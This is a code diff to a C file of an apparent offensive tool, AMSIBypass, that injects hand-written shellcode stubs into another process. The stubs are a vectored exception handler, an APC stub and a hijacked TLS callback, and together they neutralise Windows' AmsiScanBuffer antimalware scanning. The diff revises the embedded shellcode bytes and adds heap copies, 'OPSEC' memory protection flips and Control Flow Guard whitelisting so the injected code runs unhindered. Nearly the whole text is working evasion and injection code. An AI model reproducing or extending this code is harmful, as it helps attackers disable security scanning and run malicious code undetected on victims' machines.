@@ -1,21 +1,23 @@
 #include "AMSIBypass.h"
 
 // These are generated via xxd from the .bin files
-UCHAR veh_bin[] = {
+UCHAR veh_bin[] = {                                                
   0x4c, 0x8b, 0x41, 0x08, 0x4c, 0x8b, 0x09, 0x41, 0x8b, 0x01, 0x3d, 0x03,
-  0x00, 0x00, 0x80, 0x74, 0x0a, 0x3d, 0x04, 0x00, 0x00, 0x80, 0x74, 0x27,
-  0x31, 0xc0, 0xc3, 0x4c, 0x8d, 0x15, 0x5e, 0x00, 0x00, 0x00, 0x4d, 0x8b,
-  0x12, 0x4d, 0x89, 0x50, 0x48, 0x49, 0xc7, 0x40, 0x60, 0x01, 0x00, 0x00,
-  0x00, 0x49, 0x83, 0x80, 0xf8, 0x00, 0x00, 0x00, 0x01, 0xb8, 0xff, 0xff,
-  0xff, 0xff, 0xc3, 0x4d, 0x8b, 0x98, 0xf8, 0x00, 0x00, 0x00, 0x4c, 0x8d,
-  0x15, 0x33, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x12, 0x4d, 0x39, 0xd3, 0x75,
-  0x27, 0x41, 0xc7, 0x40, 0x78, 0x57, 0x00, 0x07, 0x80, 0x4d, 0x8b, 0x98,
-  0x98, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x13, 0x4d, 0x89, 0x90, 0xf8, 0x00,
-  0x00, 0x00, 0x49, 0x83, 0x80, 0x98, 0x00, 0x00, 0x00, 0x08, 0xb8, 0xff,
-  0xff, 0xff, 0xff, 0xc3, 0x31, 0xc0, 0xc3, 0x90, 0xaa, 0xaa, 0xaa, 0xaa,
-  0xaa, 0xaa, 0xaa, 0xaa
+  0x00, 0x00, 0x80, 0x74, 0x0a, 0x3d, 0x04, 0x00, 0x00, 0x80, 0x74, 0x2c,
+  0x31, 0xc0, 0xc3, 0x4c, 0x8d, 0x15, 0x7e, 0x00, 0x00, 0x00, 0x4d, 0x8b,  
+  0x12, 0x4d, 0x89, 0x50, 0x48, 0x41, 0xc7, 0x40, 0x70, 0x01, 0x00, 0x00,  
+  0x00, 0x41, 0x83, 0x48, 0x30, 0x10, 0x49, 0x83, 0x80, 0xf8, 0x00, 0x00,  
+  0x00, 0x01, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xc3, 0x4d, 0x8b, 0x98, 0xf8,
+  0x00, 0x00, 0x00, 0x4c, 0x8d, 0x15, 0x4e, 0x00, 0x00, 0x00, 0x4d, 0x8b,  
+  0x12, 0x4d, 0x39, 0xd3, 0x75, 0x3d, 0x4d, 0x8b, 0x98, 0x98, 0x00, 0x00,  
+  0x00, 0x4d, 0x8b, 0x63, 0x30, 0x4d, 0x85, 0xe4, 0x74, 0x08, 0x41, 0xc7,  
+  0x04, 0x24, 0x01, 0x00, 0x00, 0x00, 0x41, 0xc7, 0x40, 0x68, 0x00, 0x00,
+  0x00, 0x00, 0x4d, 0x8b, 0x13, 0x4d, 0x89, 0x90, 0xf8, 0x00, 0x00, 0x00,  
+  0x49, 0x83, 0x80, 0x98, 0x00, 0x00, 0x00, 0x08, 0x41, 0x83, 0x48, 0x30,  
+  0x10, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xc3, 0x31, 0xc0, 0xc3, 0x90, 0x90,  
+  0x90, 0x90, 0x90, 0x90, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
 };
-UINT veh_bin_len = 136;
+UINT veh_bin_len = 168;
 
 UCHAR apc_bin[] = {
   0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x01, 0x00, 0x00,
@@ -31,7 +33,7 @@ UCHAR TLSCallback_bin[] = {
 };
 UINT TLSCallback_bin_len = 7;
 
-BOOL ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
+PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
     printf("[*] Applying TLS Hijacking AMSI Bypass via VEH handler...\n");
     // The idea is to patch the first TLS callback of the process to point to our APC stub, which in turn will register our VEH handler and call it directly
     // This technique is really stealthy as it doesn't require any APC queuing or thread context manipulation, but it requires the target process to have a TLS directory with at least one callback (which is the case for powershell for example)
@@ -116,6 +118,7 @@ BOOL ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
 
     printf("[+] TLS Hijacking successful! Shellcode will execute on ResumeThread.\n");
 
+    return pRemoteTLSCallback;
 }
 
 // Helper function to scan the shellcode array and patch 8-byte placeholders
@@ -130,12 +133,13 @@ BOOL PatchPlaceholder(UCHAR* payload, SIZE_T payloadSize, ULONG64 placeholder, P
 }
 
 BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
-    // 1. Resolve addresses locally. Due to ASLR design on Windows, system DLLs 
-    // are mapped at the same base address across all processes in the same session.
+    // 1. Resolve addresses locally.
     HMODULE hKernel32 = CustomGetModuleHandleW(L"kernel32.dll");
     HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
     
-    HMODULE hAmsi = LoadLibraryA("amsi.dll"); 
+    // Fallback if amsi.dll is not loaded in our process yet
+    HMODULE hAmsi = CustomGetModuleHandleW(L"amsi.dll");
+    if (!hAmsi) hAmsi = LoadLibraryA("amsi.dll"); 
 
     PVOID pLoadLibraryA = (PVOID)CustomGetProcAddress(hKernel32, "LoadLibraryA");
     PVOID pRtlAddVeh = (PVOID)CustomGetProcAddress(hNtdll, "RtlAddVectoredExceptionHandler");
@@ -146,48 +150,89 @@ BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
         return FALSE;
     }
 
-    // 2. Patch VEH Stub Placeholder
-    if (!PatchPlaceholder(veh_bin, veh_bin_len, 0xAAAAAAAAAAAAAAAA, pAmsiScanBuffer)) {
-        printf("[-] Failed to patch AmsiScanBuffer address in VEH stub.\n");
+    // --- HEAP ALLOCATION (CRT-Free) ---
+    // We duplicate the stubs to the heap to avoid modifying the .rdata section if the stubs vars are put in the .rdata section
+    HANDLE hHeap = GetProcessHeap();
+    UCHAR* local_veh_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, veh_bin_len);
+    UCHAR* local_apc_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, apc_bin_len);
+
+    if (!local_veh_bin || !local_apc_bin) {
+        if (local_veh_bin) HeapFree(hHeap, 0, local_veh_bin);
+        if (local_apc_bin) HeapFree(hHeap, 0, local_apc_bin);
         return FALSE;
     }
 
-    // 3. Allocate and write VEH Stub (RW -> RX for OPSEC)
+    // CRT-Free memcpy alternative
+    for (SIZE_T i = 0; i < veh_bin_len; i++) local_veh_bin[i] = veh_bin[i];
+    for (SIZE_T i = 0; i < apc_bin_len; i++) local_apc_bin[i] = apc_bin[i];
+
+
+    // 2. Patch VEH Stub Placeholder (Using the Heap copy)
+    if (!PatchPlaceholder(local_veh_bin, veh_bin_len, 0xAAAAAAAAAAAAAAAA, pAmsiScanBuffer)) {
+        printf("[-] Failed to patch AmsiScanBuffer address in VEH stub.\n");
+        HeapFree(hHeap, 0, local_veh_bin);
+        HeapFree(hHeap, 0, local_apc_bin);
+        return FALSE;
+    }
+
+    // 3. Allocate and write VEH Stub (RW -> RX for OPSEC hehe)
     PVOID pRemoteVeh = WrapperVirtualAllocEx(hProcess, NULL, veh_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pRemoteVeh) return FALSE;
-    WrapperWriteProcessMemory(hProcess, pRemoteVeh, veh_bin, veh_bin_len, NULL);
+    if (!pRemoteVeh) goto cleanup; // Goto used for clean heap freeing
+
+    WrapperWriteProcessMemory(hProcess, pRemoteVeh, local_veh_bin, veh_bin_len, NULL);
     
     DWORD oldProtect;
     WrapperVirtualProtectEx(hProcess, pRemoteVeh, veh_bin_len, PAGE_EXECUTE_READ, &oldProtect);
 
-    // 4. Patch APC Stub Placeholders
-    PatchPlaceholder(apc_bin, apc_bin_len, 0xBBBBBBBBBBBBBBBB, pLoadLibraryA);
-    PatchPlaceholder(apc_bin, apc_bin_len, 0xCCCCCCCCCCCCCCCC, pRemoteVeh);
-    PatchPlaceholder(apc_bin, apc_bin_len, 0xDDDDDDDDDDDDDDDD, pRtlAddVeh);
+    // 4. Patch APC Stub Placeholders (Using the Heap copy)
+    PatchPlaceholder(local_apc_bin, apc_bin_len, 0xBBBBBBBBBBBBBBBB, pLoadLibraryA);
+    PatchPlaceholder(local_apc_bin, apc_bin_len, 0xCCCCCCCCCCCCCCCC, pRemoteVeh);
+    PatchPlaceholder(local_apc_bin, apc_bin_len, 0xDDDDDDDDDDDDDDDD, pRtlAddVeh);
 
     // 5. Allocate and write APC Stub
     PVOID pRemoteApc = WrapperVirtualAllocEx(hProcess, NULL, apc_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pRemoteApc) return FALSE;
-    WrapperWriteProcessMemory(hProcess, pRemoteApc, apc_bin, apc_bin_len, NULL);
+    if (!pRemoteApc) goto cleanup;
+
+    WrapperWriteProcessMemory(hProcess, pRemoteApc, local_apc_bin, apc_bin_len, NULL);
     WrapperVirtualProtectEx(hProcess, pRemoteApc, apc_bin_len, PAGE_EXECUTE_READ, &oldProtect);
 
-    
     printf("[+] VEH Handler setup at: 0x%p\n", pRemoteVeh);
     printf("[+] APC Stub setup at: 0x%p\n", pRemoteApc);
     printf("[+] Using TLS Callbacks to trigger VEH on thread creation.\n");
-    // Upon Thread Creation ntdll!LdrpCallTlsInitializers execute the TLS callback in the newly created thread
-    // So out strategy is to inject a int3 on the new thread contexte to re-execute our VEH handler onto the new thread
-    printf("[+] Using TLS Callbacks to trigger VEH on thread creation.\n");
 
-    ApplyTLSHijacking(hProcess, hThread, ImageBase);
+    PVOID pRemoteTLSCallbackStub = ApplyTLSHijacking(hProcess, hThread, ImageBase);
+
+    // --- CFG WHITELISTING ---
+    printf("[*] Whitelisting the APC stub, TLS Callback & VEH for CFG\n");
+    typedef BOOL (WINAPI * SetProcessValidCallTargets_t)(HANDLE, PVOID, SIZE_T, ULONG, PCFG_CALL_TARGET_INFO);
+    SetProcessValidCallTargets_t pSetProcessValidCallTargets = (SetProcessValidCallTargets_t)CustomGetProcAddress(CustomGetModuleHandleW(L"kernelbase.dll"), "SetProcessValidCallTargets");
+
+    if (pSetProcessValidCallTargets) {
+        CFG_CALL_TARGET_INFO cfgInfo = {0};
+        cfgInfo.Offset = 0; 
+        cfgInfo.Flags = CFG_CALL_TARGET_VALID; // Mandatory flag
+
+        pSetProcessValidCallTargets(hProcess, pRemoteTLSCallbackStub, TLSCallback_bin_len, 1, &cfgInfo);
+        pSetProcessValidCallTargets(hProcess, pRemoteApc, apc_bin_len, 1, &cfgInfo);
+        pSetProcessValidCallTargets(hProcess, pRemoteVeh, veh_bin_len, 1, &cfgInfo);
+    }
 
     // 6. Queue the APC to the target thread
-    // it will fire on resume.
     if (!WrapperQueueUserAPC((PAPCFUNC)pRemoteApc, hThread, 0)) {
         printf("[-] Failed to queue APC.\n");
-        return FALSE;
+        goto cleanup;
     }
 
     printf("[+] APC queued successfully.\n");
+
+    // Clean execution flow ends here, free memory and return TRUE
+    HeapFree(hHeap, 0, local_veh_bin);
+    HeapFree(hHeap, 0, local_apc_bin);
     return TRUE;
+
+cleanup:
+    // Error execution flow ends here
+    HeapFree(hHeap, 0, local_veh_bin);
+    HeapFree(hHeap, 0, local_apc_bin);
+    return FALSE;
 }
